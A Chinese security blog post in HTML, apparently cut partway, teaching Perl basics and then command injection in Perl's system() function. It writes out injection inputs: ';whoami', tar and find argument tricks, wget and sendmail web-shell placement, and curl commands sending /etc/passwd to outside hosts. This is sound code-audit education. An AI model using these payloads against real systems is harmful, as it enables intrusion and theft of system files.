@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head><meta name="generator" content="Hexo 3.9.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="Mi1k7ea">
+    <meta name="description" itemprop="description" content="已完结.">
+    <meta name="keywords" content=",Perl,Web安全,代码审计">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    <!-- Page Title -->
+    
+        <title>（信安之路首发）Perl基础&amp;代码审计 | Mi1k7ea</title>
+    
+    <link rel="icon" href="/img/kanxi.jpg">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    <script src="/js/script.js"></script>
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+    </style>
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    （信安之路首发）Perl基础&amp;代码审计
+                
+            
+        </p>  
+    </div>    
+
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Perl基础"><span class="toc-number">1.</span> <span class="toc-text">0x01 Perl基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行方式"><span class="toc-number">1.2.</span> <span class="toc-text">运行方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据类型"><span class="toc-number">1.3.</span> <span class="toc-text">数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本语法"><span class="toc-number">1.4.</span> <span class="toc-text">基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注释符"><span class="toc-number">1.4.1.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#空白符解析特点"><span class="toc-number">1.4.2.</span> <span class="toc-text">空白符解析特点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#单双引号解析区别"><span class="toc-number">1.4.3.</span> <span class="toc-text">单双引号解析区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Here文档"><span class="toc-number">1.4.4.</span> <span class="toc-text">Here文档</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#子程序（函数）及传参"><span class="toc-number">1.5.</span> <span class="toc-text">子程序（函数）及传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CGI环境搭建与CGI编程"><span class="toc-number">1.6.</span> <span class="toc-text">CGI环境搭建与CGI编程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Perl代码审计"><span class="toc-number">2.</span> <span class="toc-text">0x02 Perl代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#命令注入"><span class="toc-number">2.1.</span> <span class="toc-text">命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system-函数"><span class="toc-number">2.1.1.</span> <span class="toc-text">system()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#参数全部可控"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">参数全部可控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#参数部分可控"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">参数部分可控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#参数注入"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">参数注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#目录遍历"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec-函数"><span class="toc-number">2.1.2.</span> <span class="toc-text">exec()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#参数全部可控-1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">参数全部可控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#参数部分可控-1"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">参数部分可控</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readpipe-函数"><span class="toc-number">2.1.3.</span> <span class="toc-text">readpipe()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#参数全部可控-2"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">参数全部可控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#参数部分可控-2"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">参数部分可控</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#open-函数"><span class="toc-number">2.1.4.</span> <span class="toc-text">open()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#参数全部可控-3"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">参数全部可控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#参数部分可控-3"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">参数部分可控</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反引号"><span class="toc-number">2.1.5.</span> <span class="toc-text">反引号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码注入"><span class="toc-number">2.2.</span> <span class="toc-text">代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-number">2.2.1.</span> <span class="toc-text">eval</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#eval-EXPR"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">eval EXPR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#eval-BLOCK"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">eval BLOCK</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-number">2.3.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">2.4.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量覆盖"><span class="toc-number">2.5.</span> <span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#哈希引入数组变量覆盖"><span class="toc-number">2.5.1.</span> <span class="toc-text">哈希引入数组变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数组传参变量覆盖"><span class="toc-number">2.5.2.</span> <span class="toc-text">数组传参变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#随机数安全"><span class="toc-number">2.6.</span> <span class="toc-text">随机数安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件竞争"><span class="toc-number">2.7.</span> <span class="toc-text">条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-number">2.8.</span> <span class="toc-text">00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Perl漏洞实战"><span class="toc-number">3.</span> <span class="toc-text">0x03 Perl漏洞实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <p>本篇博客首发于信安之路：《perl 代码审计从基础到实战》</p>
+<h2 id="0x01-Perl基础"><a href="#0x01-Perl基础" class="headerlink" title="0x01 Perl基础"></a>0x01 Perl基础</h2><p>Perl基础部分参考自：<a href="https://www.runoob.com/perl/perl-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/perl/perl-tutorial.html</a></p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Perl全称Practical Extraction and Report Language，一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从大型机到便携设备，从快速原型创建到大规模可扩展开发，其最重要的特性是Perl内部集成了正则表达式的功能以及巨大的第三方代码库CPAN。</p>
+<p>Perl语言的应用范围很广，除CGI以外，Perl被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl被称为脚本语言中的瑞士军刀。</p>
+<p>Perl是一种弱类型语言。</p>
+<h3 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h3><ol>
+<li>交互式：<code>perl -e &lt;perl code&gt;</code></li>
+<li>运行脚本（以.pl、.PL作为后缀）：<code>perl script.pl</code></li>
+</ol>
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Perl是一种弱类型语言，所以变量不需要指定类型，Perl解释器会根据上下文自动选择匹配类型。</p>
+<p>Perl有三个基本的数据类型：</p>
+<ul>
+<li>标量：标量是 Perl 语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个<code>$</code>，表示是标量。例如：<code>$a=123;</code></li>
+<li>数组：数组变量以字符<code>@</code>开头，索引从0开始，如：<code>@arr=(1,2,3)</code></li>
+<li>哈希：哈希是一个无序的键值对集合。可以使用键作为下标获取值。哈希变量以字符<code>%</code>开头。如：<code>%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2);</code></li>
+</ul>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>Perl借用了C、sed、awk、shell脚本以及很多其他编程语言的特性，语法与这些语言有些类似，也有自己的特点。</p>
+<p>Perl 程序有声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。</p>
+<p>Perl 语言没有严格的格式规范，你可以根据自己喜欢的风格来缩进。</p>
+<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>Perl注释的方法为在语句的开头用字符<code>#</code>，如：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这一行是 perl 中的注释</span></span><br></pre></td></tr></table></figure>
+<p>Perl也支持多行注释，最常用的方法是使用POD(Plain Old Documentations) 来进行多行注释。方法如下:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 这是一个单行注释</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hello, world\n"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">=pod 注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">这是一个多行注释</span></span><br><span class="line"><span class="comment">=cut</span></span><br></pre></td></tr></table></figure>
+<p>注意：</p>
+<ul>
+<li>=pod、 =cut只能在行首。</li>
+<li>以=开头，以=cut结尾。</li>
+<li>=后面要紧接一个字符，=cut后面可以不用。</li>
+</ul>
+<h4 id="空白符解析特点"><a href="#空白符解析特点" class="headerlink" title="空白符解析特点"></a>空白符解析特点</h4><p>Perl解释器不会关心有多少个空白，所有类型的空白如空格、Tab、换行等如果在引号外解释器会忽略它，如果在引号内会原样输出。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>           <span class="string">"Hello</span></span><br><span class="line"><span class="string">          world\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line">          world</span><br></pre></td></tr></table></figure>
+<h4 id="单双引号解析区别"><a href="#单双引号解析区别" class="headerlink" title="单双引号解析区别"></a>单双引号解析区别</h4><p>Perl双引号和单引号的区别：双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出，但是用单引号定义可以使用多行文本。这点和PHP类似（双引号解析变量、而单引号不解析变量）。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line">$a = <span class="string">"mi1k7ea"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"a = $a\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'a = $a\n'</span>;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = mi1k7ea</span><br><span class="line">a = $a\n</span><br></pre></td></tr></table></figure>
+<p>Tips：</p>
+<p>（1）双中有双，单中有单都需要<code>\</code>转义。</p>
+<p>（2）双中有单或单中有双均不需要转义。</p>
+<p>（3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p>
+<h4 id="Here文档"><a href="#Here文档" class="headerlink" title="Here文档"></a>Here文档</h4><p>Here文档又称作heredoc、hereis、here-字串或here-脚本，是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line">$var = &lt;&lt;<span class="string">"Mi1k7ea"</span>;</span><br><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = $a</span><br><span class="line">Mi1k7ea</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br><span class="line"> </span><br><span class="line">$var = &lt;&lt;<span class="string">'Mi1k7ea'</span>;</span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br><span class="line">Mi1k7ea</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = 10</span><br><span class="line"></span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br></pre></td></tr></table></figure>
+<p>注意：</p>
+<ul>
+<li>必须后接分号，否则编译通不过；</li>
+<li>EOF可以用任意其它字符代替（例子用的Mi1k7ea），只需保证结束标识与开始标识一致；</li>
+<li>结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）；</li>
+<li>开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号；</li>
+<li>当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法；</li>
+</ul>
+<h3 id="子程序（函数）及传参"><a href="#子程序（函数）及传参" class="headerlink" title="子程序（函数）及传参"></a>子程序（函数）及传参</h3><p>Perl子程序即用户定义的函数。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 函数调用</span></span><br><span class="line">Hello();</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
+<p>Perl函数参数使用特殊数组<code>@_</code>标明，函数第一个参数为<code>$_[0]</code>、第二个参数为<code>$_[1]</code>，依次类推。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">'传入的参数：'</span>, <span class="string">"@_\n"</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"$_[0].$_[1]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"返回结果："</span>, Test(<span class="string">'mi1k7ea'</span>, <span class="string">'com'</span>), <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传入的参数：mi1k7ea com</span><br><span class="line">返回结果：mi1k7ea.com</span><br></pre></td></tr></table></figure>
+<h3 id="CGI环境搭建与CGI编程"><a href="#CGI环境搭建与CGI编程" class="headerlink" title="CGI环境搭建与CGI编程"></a>CGI环境搭建与CGI编程</h3><p>CGI环境搭建：下载Apache httpd服务器，直接运行然后访问<code>http://localhost/cgi-bin/printEnv.pl</code>即可：</p>
+<p><img src="/2020/11/24/Perl基础-代码审计/29.png" alt=""></p>
+<p>正常没问题的话是如上图所示。注意一点，pl或cgi文件中第一行指定perl程序所在路径必须正确，否则会出现500 Error，我这里本地修改为<code>#!D:\Strawberry\perl\bin\perl.exe</code>。</p>
+<p>第一个CGI程序，test.cgi：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/Strawberry/perl/bin/perl.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type:text/html\r\n\r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;html&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;head&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;meta charset="utf-8"&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;title&gt;mi1k7ea.com&lt;/title&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/head&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;body&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;h2&gt;Hello World!&lt;/h2&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Mi1k7ea的第一个CGI程序。&lt;/p&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/body&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;/html&gt;'</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/30.png" alt=""></p>
+<p>更多具体CGI参考：<a href="https://www.runoob.com/perl/perl-cgi-programming.html" target="_blank" rel="noopener">Perl CGI编程</a></p>
+<h2 id="0x02-Perl代码审计"><a href="#0x02-Perl代码审计" class="headerlink" title="0x02 Perl代码审计"></a>0x02 Perl代码审计</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h4><p>system()函数执行命令是有回显的。system后可以有圆括号，也可以没有。</p>
+<h5 id="参数全部可控"><a href="#参数全部可控" class="headerlink" title="参数全部可控"></a>参数全部可控</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">"echo hacked"</span>;</span><br><span class="line"><span class="keyword">system</span>($cmd)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $cmd = $ARGV[0];</span></span><br><span class="line"><span class="comment"># system($cmd);</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/2.png" alt=""></p>
+<h5 id="参数部分可控"><a href="#参数部分可控" class="headerlink" title="参数部分可控"></a>参数部分可控</h5><p>直接拼接命令的场景，可使用命令注入分隔符绕过：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$param = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"cat /tmp/$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $param = ";whoami";</span></span><br><span class="line"><span class="comment"># system("cat /tmp/$param");</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/3.png" alt=""></p>
+<p>将命令和参数分隔开就不行了，原因在于传递给system的参数变成了数组形式、严格按命令和参数进行区分了：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$param = <span class="string">";ls"</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"echo"</span>, <span class="string">"helloworld$param"</span>);</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># @cmd = ("echo","helloworld;ls");</span></span><br><span class="line"><span class="comment"># system @cmd;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># $param = $ARGV[0];</span></span><br><span class="line"><span class="comment"># system("echo", "helloworld$param");</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/6.png" alt=""></p>
+<h5 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h5><p>由前面数组形式执行system函数知道，命令注入是不成功的，但是某些写死的命令是可以进行参数注入的。但是这种注入方式较苛刻，需要有两处连续的可控点。</p>
+<p><strong>tar参数注入</strong></p>
+<p>tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。注入点需要–use-compress-program参数及其后面的参数值两处。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@cmd = (<span class="string">"tar"</span>,<span class="string">"--use-compress-program"</span>,<span class="string">"touch /tmp/perltest/mi1k7ea"</span>,<span class="string">"-cf"</span>,<span class="string">"/tmp/perltest/passwd"</span>,<span class="string">"/etc/passwd"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/4.png" alt=""></p>
+<p><strong>find参数注入</strong></p>
+<p>find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。注入点需要–execs参数及其后面的参数值两处。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@cmd = (<span class="string">"find"</span>,<span class="string">"/tmp"</span>,<span class="string">"-iname"</span>,<span class="string">"sth"</span>,<span class="string">"-or"</span>,<span class="string">"-exec"</span>,<span class="string">"id"</span>,<span class="string">";"</span>,<span class="string">"-quit"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/7.png" alt=""></p>
+<p><strong>wget参数注入</strong></p>
+<p>wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。注入点需要–directory-prefix参数及其后面的参数值两处和远程URL地址一处。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@cmd = (<span class="string">"wget"</span>,<span class="string">"--directory-prefix"</span>,<span class="string">"/var/www/html"</span>,<span class="string">"http://127.0.0.1:8080/shell.php"</span>);</span><br><span class="line"><span class="keyword">system</span> @cmd;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/8.png" alt=""></p>
+<p><strong>sendmail参数注入</strong></p>
+<p>sendmail涉及到参数注入的几个参数：</p>
+<ol>
+<li>-O option = value：QueueDirectory = queuedir 选择队列消息</li>
+<li>-X logfile：这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。</li>
+<li>-C file：这个参数用File变量指定的备用配置文件启动sendmail命令。</li>
+</ol>
+<p>常见的参数注入方式，这里只列出用法不举例了：</p>
+<ul>
+<li>向Web目录写日志Shell：<code>-O QueueDirectory=/tmp -X /var/www/html/log-shell.php</code></li>
+<li>任意文件读取：<code>-C/etc/passwd -X/tmp/output.txt</code></li>
+</ul>
+<p><strong>curl参数注入</strong></p>
+<p>curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。</p>
+<p>常见的参数注入方式，这里只列出用法不举例了：</p>
+<ul>
+<li>以POST方式提交任意文件：<code>-F filename=@/etc/passwd http://a.com/b.php</code></li>
+<li>上传任意文件：<code>-T /etc/passwd ftp://10.0.0.10</code></li>
+</ul>
+<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>在参数部分可控且不存在参数注入的场景下，如果注入的参数值为文件路径，那么就可以尝试进行目录遍历攻击。</p>
+<p>比如：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$param = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"cat /tmp/$param"</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/11/24/Perl基础-代码审计/9.png" alt=""></p>
+<h4 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec()函数"></a>exec()函数</h4><p>exec()函数和system()函数类似，执行命令是有回显的。exec后可以有圆括号，也可以没有。两者最大的区别是system()函数创建了一个fork进程，并等待查看命令是成功还是失败（返回一个值）；而exec()函数不返回任何内容，它只是执行命令。</p>
